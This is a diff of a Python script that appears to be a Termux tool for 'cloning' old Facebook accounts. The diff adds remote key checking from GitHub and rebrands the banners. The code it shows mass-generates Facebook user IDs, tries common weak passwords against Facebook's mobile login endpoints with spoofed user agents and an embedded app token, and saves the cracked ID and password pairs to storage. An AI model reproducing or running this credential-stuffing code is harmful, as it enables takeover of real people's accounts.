@@ -21,8 +21,8 @@ import os, sys
 youtube_link = "https://youtube.com/@raja-vau-teach-world?si=KeIo3GwUzYIrmbCI"
 whatsapp_link = "https://chat.whatsapp.com/K9E5ULcGZ7G0O15wwvodfy?s=sh&p=a&mlu=4&ilr=4"
 
-# Valid Key for Approval System
-approved_keys = ["RAJA_VAU_PUBLIC", "RAJA123", "KAMAL123"]
+# GitHub Raw Keys Link
+github_keys_url = "https://raw.githubusercontent.com/rajavau379-pixel/Raja-Vau-Teach-World/refs/heads/main/keys.txt"
 
 def first_step():
     os.system("clear")
@@ -32,15 +32,22 @@ def first_step():
     print("\033[1;32m JOIN YOUTUBE & WHATSAPP CHANNEL ✅ \033[0m\n")
     print("\033[1;32m PEHLE YOUTUBE SUBSCRIBE AUR WHATSAPP JOIN KARO ✅ \033[0m\n")
 
-    # Open YouTube and WhatsApp automatically
     os.system(f'xdg-open {youtube_link}')
     os.system(f'xdg-open {whatsapp_link}')
 
     input("\n[↩] JAB SUBSCRIBE AUR JOIN KAR LENA TAB ENTER DABAO...")
 
 def check_key():
+    try:
+        response = requests.get(github_keys_url)
+        approved_keys = response.text.splitlines()
+    except:
+        print("\n\033[1;31m[×] INTERNET CONNECTION ERROR OR INVALID URL!\033[0m")
+        sys.exit()
+
     user_key = input("\n[?] ENTER YOUR KEY: ")
-    if user_key in approved_keys:
+    
+    if user_key.strip() in [key.strip() for key in approved_keys]:
         print("\n\033[1;32mWELCOME TO RAJA VAU TEACH WORLD")
         print("YOUR KEY APPROVED\033[0m\n")
         time.sleep(2)
@@ -76,7 +83,6 @@ os.system('python -m pip install --upgrade httpx beautifulsoup4')
 print('loading Modules ...\n')
 os.system('clear')
 
-# Open links
 os.system(f'xdg-open {youtube_link}')
 os.system(f'xdg-open {whatsapp_link}')
 
@@ -126,7 +132,6 @@ cps = []
 loop = 0
 user = []
 
-# Color codes for terminal output
 X = '\x1b[1;37m'
 rad = '\x1b[38;5;196m'
 G = '\x1b[38;5;46m'
@@ -183,7 +188,7 @@ def window1():
     D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
     return random.choice([A, B, C, D])
 
-sys.stdout.write('\x1b]2;𓆩【👑RAJA VAU👑 】𓆪 \x07')
+sys.stdout.write('\x1b]2;𓆩【👑RAJA VAU & KAMAL👑 】𓆪 \x07')
 
 def ____banner____():
     if 'win' in sys.platform:
@@ -193,19 +198,18 @@ def ____banner____():
     
     print("""\033[1;32m
   
- ██████╗  ██████╗ ██╗     ██╗   ██╗
-██╔════╝ ██╔═══██╗██║     ██║   ██║
-██║  ███╗██║   ██║██║     ██║   ██║
-██║   ██║██║   ██║██║     ██║   ██║
-╚██████╔╝╚██████╔╝███████╗╚██████╔╝
- ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝                                               
+██   ██  █████  ███    ███  █████  ██
+██  ██  ██   ██ ████  ████ ██   ██ ██
+█████   ███████ ██ ██ ██ ██ ███████ ██
+██  ██  ██   ██ ██  █  ██ ██   ██ ██
+██   ██ ██   ██ ██     ██ ██   ██ ███████                                               
 \033[1;35m[+]PEHCHAN TO SAB SE HAI PAR BHAROSHA KHUDPE HE")   
  \033[1;32m----------------------------------------------                           
  \033[1;32m[+] OWNER  :       RAJA VAU 💞 KAMAL       💞🅛︎🅞︎ⓥⓔ💞
- \033[1;33m[+] BESTIE :       RAJA VAU 💞 LOVE         ….. (¯`v´¯)♥
- \033[1;33m[+] BESTU  :       RAJA VAU 💞 VAU      🫨…….•.¸.•´💞
+ \033[1;33m[+] BESTIE :       RAJA VAU 💞 KAMAL        ….. (¯`v´¯)♥
+ \033[1;33m[+] BESTU  :       RAJA VAU 💞 KAMAL    🫨…….•.¸.•´💞
  \033[1;33m[+] TOOLS  :       FB💞OLD🥵CLONIC 🫨….¸.•´💞
- \033[1;33m[+] STATUS :       RAJA VAU KEY APROVEL 🫨… (♡💞
+ \033[1;33m[+] STATUS :       RAJA VAU & KAMAL KEY APROVEL 🫨… (♡💞
   \033[1;32m----------------------------------------------
 \033[1;35m[+]CHAHRE HASIPE MATJANA DIL KABRUSTAN BANAYE HUON """)
 
@@ -278,7 +282,7 @@ def linex():
 
 def BNG_71_():
     ____banner____()
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD ACCOUNT TOOL (RAJA VAU)')
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD ACCOUNT TOOL (RAJA VAU & KAMAL)')
     linex()
     __Jihad__ = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
     if __Jihad__ in ('A', 'a', '01', '1'):
@@ -347,8 +351,8 @@ def old_Tow():
     ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
     linex()
     ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
     linex()
     prefixes = ['100003', '100004']
     for _ in range(int(limit)):
@@ -411,7 +415,7 @@ def login_1(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA VAU OK ID-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA VAU & KAMAL OK ID-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
@@ -456,13 +460,13 @@ def login_1(uid):
             }
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA VAU \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/RAJA-VAU-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA VAU & KAMAL \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/RAJA-VAU-KAMAL-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA VAU\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/RAJA-VAU-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA VAU & KAMAL\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/RAJA-VAU-KAMAL-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
         loop += 1
@@ -470,7 +474,7 @@ def login_1(uid):
         time.sleep(5)
 
 def login_2(uid):
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA VAU -M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA VAU & KAMAL -M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
     
     for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
         try:
@@ -488,13 +492,13 @@ def login_2(uid):
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA VAU XD\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/RAJA-VAU-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAJA VAU & KAMAL XD\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/RAJA-VAU-KAMAL-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
                 elif 'session_key' in po:
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA VAU \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/RAJA-VAU-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA VAU & KAMAL \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/RAJA-VAU-KAMAL-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
         except Exception as e:
